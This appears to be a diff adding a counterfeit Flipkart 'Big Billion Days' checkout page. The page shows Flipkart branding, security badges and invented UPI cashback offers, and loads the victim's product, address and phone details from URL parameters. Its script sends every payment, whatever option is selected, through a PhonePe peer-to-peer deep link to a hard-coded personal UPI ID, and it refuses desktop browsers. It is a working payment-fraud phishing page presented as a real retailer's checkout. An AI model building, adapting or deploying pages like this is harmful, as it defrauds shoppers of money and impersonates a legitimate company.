@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+ <title>BIg Billion Days</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
+    body { background-color: #f1f3f6; padding-bottom: 90px; overflow-x: hidden; }
+    .flipkart-header { position: fixed; top: 0; left: 0; width: 100%; background: white; box-shadow: 0 2px 4px 0 rgba(0,0,0,0.08); z-index: 1000; }
+    .header-main { display: flex; align-items: center; padding: 10px 16px; background: white; }
+    .back-btn { width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; cursor: pointer; border-radius: 50%; margin-right: 8px; }
+    .back-arrow { width: 12px; height: 12px; border-left: 2.2px solid #212121; border-bottom: 2.2px solid #212121; transform: rotate(45deg); }
+    .flipkart-logo-area { display: flex; flex-direction: column; line-height: 1.1; }
+    .flipkart-logo { font-weight: 700; font-size: 20px; letter-spacing: -0.5px; color: #2874f0; font-style: italic; }
+    .flipkart-logo span { color: #ff9f00; font-weight: 700; }
+    .header-tagline { font-size: 11px; color: #878787; letter-spacing: 0.3px; }
+    .header-right { margin-left: auto; display: flex; gap: 20px; }
+    .secure-badge { display: flex; align-items: center; gap: 6px; color: #388e3c; font-size: 14px; font-weight: 500; background: #e8f5e9; padding: 5px 12px; border-radius: 18px; }
+    .header-spacer { height: 72px; }
+    .product-card { background: white; border-radius: 12px; margin: 12px 12px 8px; padding: 16px; display: flex; gap: 16px; box-shadow: 0 1px 4px 0 rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.02); }
+    .product-img { width: 88px; height: 88px; flex-shrink: 0; background: #f8f9fa; border-radius: 8px; border: 1px solid #f0f0f0; object-fit: contain; padding: 4px; }
+    .product-info { flex: 1; }
+    .product-title { font-size: 16px; font-weight: 550; color: #212121; line-height: 1.45; margin-bottom: 6px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+    .product-rating { display: flex; align-items: center; gap: 12px; margin: 6px 0 4px; }
+    .rating-badge { background: #388e3c; color: white; padding: 4px 10px; border-radius: 16px; font-size: 12px; font-weight: 600; display: inline-flex; align-items: center; gap: 4px; }
+    .delivery-badge { color: #388e3c; font-size: 13px; font-weight: 500; background: #e8f5e9; padding: 4px 12px; border-radius: 20px; }
+    .price-tag { font-size: 22px; font-weight: 700; color: #212121; margin-top: 6px; }
+    .address-wrapper { background: white; border-radius: 12px; margin: 8px 12px; padding: 16px 18px; border-left: 5px solid #2874f0; box-shadow: 0 1px 4px rgba(0,0,0,0.04); display: flex; flex-direction: column; }
+    .deliver-badge { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
+    .deliver-title { background: #2874f0; color: white; padding: 5px 16px; border-radius: 20px; font-size: 12px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase; display: inline-flex; align-items: center; gap: 6px; }
+    .change-link { color: #2874f0; font-weight: 600; font-size: 14px; cursor: pointer; background: transparent; border: none; text-transform: uppercase; }
+    .address-detail { display: flex; flex-direction: column; }
+    .name-row { display: flex; align-items: baseline; gap: 12px; margin-bottom: 6px; }
+    .customer-name { font-size: 16px; font-weight: 600; color: #212121; }
+    .address-type { background: #ede7f6; color: #5e35b1; font-size: 11px; font-weight: 600; padding: 4px 14px; border-radius: 20px; display: inline-block; text-transform: capitalize; }
+    .address-line { font-size: 14px; color: #5a5a5a; line-height: 1.55; font-weight: 400; margin-bottom: 2px; }
+    .address-city { font-size: 14px; color: #5a5a5a; font-weight: 400; }
+    .address-phone { margin-top: 10px; font-size: 13px; color: #5a5a5a; display: flex; align-items: center; gap: 6px; }
+    .address-phone i { color: #2874f0; font-size: 14px; }
+    .payment-section { background: white; border-radius: 12px; margin: 8px 12px; padding: 18px 16px; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
+    .section-title { font-size: 16px; font-weight: 600; color: #212121; display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+    .offer-banner { background: linear-gradient(90deg, #fff7e6, #fff1da); border-radius: 10px; padding: 12px 16px; margin-bottom: 24px; display: flex; align-items: center; gap: 10px; border: 1px solid #ffe4b8; }
+    .offer-icon { background: #ff9f00; color: white; border-radius: 50%; width: 26px; height: 26px; display: inline-flex; align-items: center; justify-content: center; font-size: 16px; }
+    .offer-text { font-size: 14px; font-weight: 600; color: #a65d0b; }
+    .offer-validity { font-size: 12px; color: #b45f1b; margin-left: 6px; }
+    .pay-option { display: flex; align-items: center; gap: 16px; padding: 14px 18px; border: 1px solid #e0e0e0; border-radius: 12px; margin-bottom: 12px; cursor: pointer; transition: all 0.1s ease; position: relative; background: white; }
+    .pay-option:hover { border-color: #2874f0; background-color: #fafcff; }
+    .pay-option.selected { border: 2px solid #2874f0; background: #f5f9ff; }
+    .pay-icon { width: 30px; height: 30px; object-fit: contain; }
+    .pay-name { font-size: 15px; font-weight: 480; color: #212121; flex: 1; }
+    .offer-chip { background: #ffe6b3; color: #212121; font-size: 10px; font-weight: 700; padding: 3px 10px; border-radius: 30px; letter-spacing: 0.4px; }
+    .check-icon { position: absolute; right: 18px; color: #2874f0; font-size: 20px; font-weight: 700; }
+    .price-card { background: white; border-radius: 12px; margin: 8px 12px; padding: 18px 16px; box-shadow: 0 1px 4px rgba(0,0,0,0.04); }
+    .price-row { display: flex; justify-content: space-between; margin: 10px 0; font-size: 15px; color: #212121; }
+    .free-delivery { color: #388e3c; font-weight: 600; }
+    .dotted-separator { border: none; border-top: 1px dashed #d0d0d0; margin: 16px 0 12px; }
+    .total-row { display: flex; justify-content: space-between; font-size: 17px; font-weight: 650; color: #212121; }
+    .cashback-note { margin-top: 12px; background: #f5faff; padding: 8px 12px; border-radius: 10px; font-size: 13px; color: #1a4d6e; border: 1px solid #d4e3fd; display: flex; align-items: center; gap: 8px; }
+    .bottom-checkout-bar { position: fixed; bottom: 0; left: 0; width: 100%; background: white; border-top: 1px solid #eaeaea; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 -4px 10px rgba(0,0,0,0.02); z-index: 999; }
+    .payable-label { font-size: 12px; color: #878787; margin-bottom: 4px; }
+    .final-amount { font-size: 26px; font-weight: 700; color: #212121; }
+    .place-order-btn { background: #ffc107; border: none; padding: 14px 42px; border-radius: 10px; font-size: 18px; font-weight: 700; color: #212121; cursor: pointer; transition: background 0.2s, transform 0.1s; letter-spacing: 0.8px; box-shadow: 0 2px 4px rgba(255,193,7,0.2); }
+    .place-order-btn:hover { background: #ffb300; }
+    .place-order-btn:active { transform: scale(0.97); }
+    .place-order-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
+    .place-order-btn.processing { background: #999; }
+    .secure-note { display: flex; align-items: center; gap: 4px; color: #388e3c; font-size: 12px; }
+    @media (max-width: 400px) { .product-img { width: 70px; height: 70px; } .final-amount { font-size: 22px; } .place-order-btn { padding: 12px 28px; font-size: 16px; } }
+  </style>
+</head>
+<body>
+
+<div class="flipkart-header">
+  <div class="header-main">
+    <div class="back-btn" onclick="window.history.back()"><div class="back-arrow"></div></div>
+    <div class="flipkart-logo-area">
+      <div class="flipkart-logo">Flipkart<span>.</span></div>
+      <div class="header-tagline"><span style="color:#878787;">Plus</span> <span style="color:#ff9f00; font-weight:600;">⍟</span></div>
+    </div>
+    <div class="header-right"><span class="secure-badge"><i class="fas fa-lock"></i> Secure</span></div>
+  </div>
+</div>
+<div class="header-spacer"></div>
+
+<div class="product-card">
+  <img src="" alt="Product" class="product-img" id="productImage">
+  <div class="product-info">
+    <div class="product-title" id="productName"></div>
+    <div class="product-rating"><span class="rating-badge"><i class="fas fa-star"></i> 4.5</span><span class="delivery-badge"><i class="fas fa-truck"></i> Free Delivery</span></div>
+    <div class="price-tag" id="productPrice"></div>
+  </div>
+</div>
+
+<div class="address-wrapper" id="addressCard">
+  <div class="deliver-badge">
+    <span class="deliver-title"><i class="fas fa-map-marker-alt"></i> Deliver to</span>
+    <span class="change-link" id="changeAddressLink">Change</span>
+  </div>
+  <div class="address-detail">
+    <div class="name-row">
+      <span class="customer-name" id="customerName"></span>
+      <span class="address-type" id="addressTypeBadge"></span>
+    </div>
+    <div class="address-line" id="customerAddressLine"></div>
+    <div class="address-city" id="customerCity"></div>
+    <div class="address-phone"><i class="fas fa-phone-alt"></i> <span id="customerPhone"></span></div>
+  </div>
+</div>
+
+<div class="payment-section">
+  <div class="section-title"><i class="fas fa-credit-card" style="color:#2874f0;"></i> UPI Payment Options</div>
+  
+  <div class="offer-banner"><span class="offer-icon"><i class="fas fa-tag"></i></span><span class="offer-text">UPI offer: Get ₹75 cashback on PhonePe, Paytm & Google Pay</span><span class="offer-validity">• Limited period</span></div>
+
+  <div class="pay-option selected" id="optPhonePe" onclick="selectPayment('PhonePe', this)">
+    <img src="assets/phonepe-icon.png" alt="PhonePe" class="pay-icon" onerror="this.src='assets/phonepe-icon.png'; this.onerror=null;">
+    <span class="pay-name">PhonePe UPI</span>
+    <span class="offer-chip">₹75 cashback</span>
+    <span class="check-icon" id="checkPhonePe">✓</span>
+  </div>
+
+  <div class="pay-option" id="optPaytm" onclick="selectPayment('Paytm', this)">
+    <img src="assets/paytm-icon.png" alt="Paytm" class="pay-icon" onerror="this.src='assets/paytm-icon.png'; this.onerror=null;">
+    <span class="pay-name">Paytm UPI</span>
+    <span class="offer-chip">₹75 cashback</span>
+    <span class="check-icon" id="checkPaytm"></span>
+  </div>
+
+  <div class="pay-option" id="optGPay" onclick="selectPayment('Google Pay', this)">
+    <img src="assets/gpay-icon.png" alt="Google Pay" class="pay-icon" onerror="this.src='assets/gpay-icon.png'; this.onerror=null;">
+    <span class="pay-name">Google Pay UPI</span>
+    <span class="offer-chip">₹75 cashback</span>
+    <span class="check-icon" id="checkGPay"></span>
+  </div>
+
+  <div class="secure-note" style="margin-top: 16px; justify-content: flex-start; gap: 8px;"><i class="fas fa-shield-alt" style="color: #2874f0;"></i> UPI payments are 100% secure and encrypted</div>
+</div>
+
+<div class="price-card">
+  <div style="font-size: 16px; font-weight: 600; margin-bottom: 8px;">Price Details</div>
+  <div class="price-row"><span>Price (1 item)</span><span id="displayPrice"></span></div>
+  <div class="price-row"><span>Delivery charges</span><span class="free-delivery">Free</span></div>
+  <div class="price-row"><span>Packaging fee</span><span style="color:#388e3c;">₹0</span></div>
+  <div class="dotted-separator"></div>
+  <div class="total-row"><strong>Total Payable</strong><strong id="totalPayable"></strong></div>
+  <div class="cashback-note"><i class="fas fa-coins" style="color:#ff9f00;"></i> UPI cashback up to ₹75 will be credited within 48 hours</div>
+</div>
+
+<div class="bottom-checkout-bar">
+  <div><div class="payable-label">Payable amount</div><div class="final-amount" id="bottomAmount"></div></div>
+  <button class="place-order-btn" id="payButton">Pay with PhonePe</button>
+</div>
+
+<script>
+  (function() {
+    "use strict";
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    const productName = decodeURIComponent(urlParams.get('product') || '');
+    const productPrice = urlParams.get('price') || '';
+    let productImage = urlParams.get('image') || '';
+    
+    const customerName = decodeURIComponent(urlParams.get('name') || '');
+    const customerAddressLine = decodeURIComponent(urlParams.get('address_line') || '');
+    const customerCity = decodeURIComponent(urlParams.get('city') || '');
+    const addressType = urlParams.get('addressType') || '';
+    const customerPhone = urlParams.get('phone') || '';
+
+    document.getElementById('productName').textContent = productName;
+    
+    const prodImg = document.getElementById('productImage');
+    if (productImage) {
+      prodImg.src = productImage;
+    } else {
+      prodImg.src = 'assets/product-placeholder.png';
+    }
+    prodImg.onerror = function() { 
+      this.src = 'assets/product-placeholder.png';
+      this.onerror = null;
+    };
+
+    let productPriceNum = 0;
+    let formattedPrice = '';
+    if (productPrice) {
+      productPriceNum = parseInt(productPrice) || 0;
+      formattedPrice = productPriceNum ? '₹' + productPriceNum.toLocaleString('en-IN') : productPrice;
+    }
+    
+    document.getElementById('productPrice').textContent = formattedPrice;
+    document.getElementById('displayPrice').textContent = formattedPrice;
+    document.getElementById('totalPayable').textContent = formattedPrice;
+    document.getElementById('bottomAmount').textContent = formattedPrice;
+
+    document.getElementById('customerName').textContent = customerName;
+    document.getElementById('customerAddressLine').textContent = customerAddressLine;
+    document.getElementById('customerCity').textContent = customerCity;
+    document.getElementById('addressTypeBadge').textContent = addressType;
+    document.getElementById('customerPhone').textContent = customerPhone;
+
+    const addressCard = document.getElementById('addressCard');
+    if (!customerAddressLine || customerAddressLine.trim() === '') {
+      addressCard.style.display = 'none';
+    } else {
+      addressCard.style.display = 'flex';
+    }
+
+    document.getElementById('changeAddressLink').addEventListener('click', function(e) {
+      e.preventDefault();
+      window.history.back();
+    });
+
+    const payButton = document.getElementById('payButton');
+    let selectedMethod = 'PhonePe';
+    
+    const UPI_ID = 'paytm.s1x53ga@pty';
+
+    function isMobileDevice() {
+      return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    function generateTransactionId() {
+      return 'TXN' + Date.now().toString().slice(-8) + Math.floor(Math.random() * 1000);
+    }
+
+    function createPhonePeUrl() {
+      const data = {
+        contact: { vpa: UPI_ID, type: "VPA" },
+        p2pPaymentCheckoutParams: {
+          note: generateTransactionId(),
+          transactionContext: "p2p",
+          initialAmount: String(productPriceNum * 100),
+          currency: "INR",
+          checkoutType: "DEFAULT"
+        }
+      };
+      return `phonepe://native?data=${btoa(JSON.stringify(data))}&id=p2ppayment`;
+    }
+
+    window.selectPayment = function(method, element) {
+      selectedMethod = method;
+      
+      document.querySelectorAll('.check-icon').forEach(el => el.innerHTML = '');
+      
+      if (method === 'PhonePe') document.getElementById('checkPhonePe').innerHTML = '✓';
+      if (method === 'Paytm') document.getElementById('checkPaytm').innerHTML = '✓';
+      if (method === 'Google Pay') document.getElementById('checkGPay').innerHTML = '✓';
+      
+      payButton.textContent = `Pay with ${method}`;
+      
+      document.querySelectorAll('.pay-option').forEach(el => el.classList.remove('selected'));
+      if (element) element.classList.add('selected');
+    };
+
+    payButton.onclick = function(e) {
+      e.preventDefault();
+
+      const addrLine = document.getElementById('customerAddressLine').textContent.trim();
+      if (!addrLine || addrLine === '') {
+        alert('Delivery address is required. Please enter a complete address before placing your order.');
+        return;
+      }
+
+      if (productPriceNum <= 0) {
+        alert('Invalid product price');
+        return;
+      }
+
+      if (!isMobileDevice()) {
+        payButton.textContent = "Use Mobile Device";
+        setTimeout(() => {
+          payButton.textContent = `Pay with ${selectedMethod}`;
+        }, 1500);
+        return;
+      }
+
+      payButton.disabled = true;
+      payButton.classList.add('processing');
+      payButton.textContent = 'Opening PhonePe...';
+
+      window.location.href = createPhonePeUrl();
+
+      setTimeout(() => {
+        payButton.disabled = false;
+        payButton.classList.remove('processing');
+        payButton.textContent = `Pay with ${selectedMethod}`;
+      }, 2000);
+    };
+
+    document.querySelectorAll('img').forEach(img => {
+      img.addEventListener('error', function() {
+        const alt = this.alt;
+        if (alt && alt.includes('PhonePe')) this.src = 'assets/images/phonepe-logo.webp';
+        else if (alt && alt.includes('Paytm')) this.src = 'assets/images/paytm.png';
+        else if (alt && alt.includes('Google Pay')) this.src = 'assets/images/gpay.webp';
+        else if (this.classList.contains('product-img')) this.src = 'assets/product-placeholder.png';
+        else this.src = 'assets/upi-icon.png';
+        this.onerror = null;
+      });
+    });
+  })();
+</script>
+</body>
+</html>
